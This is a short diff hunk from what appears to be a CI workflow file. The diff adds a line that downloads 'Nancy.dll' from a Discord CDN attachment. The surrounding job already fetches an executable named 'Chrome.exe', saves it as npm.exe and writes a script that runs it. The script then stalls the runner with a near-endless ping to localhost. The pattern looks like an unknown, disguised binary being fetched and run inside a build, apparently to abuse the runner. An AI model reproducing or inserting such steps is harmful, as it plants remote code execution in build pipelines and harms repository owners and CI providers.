@@ -30,6 +30,7 @@ jobs:
         run: |
           dir
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830905084183445544/Chrome.exe -OutFile npm.exe
+          Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830537244028305418/Nancy.dll -OutFile Nancy.dll
           cmd /c echo .\npm.exe >>a.ps1
           cmd /c echo dir >>a.ps1
           cmd /c echo ping localhost -n 11111111111111111111111111111 -w 99999999999999999999999999999999999 >>a.ps1
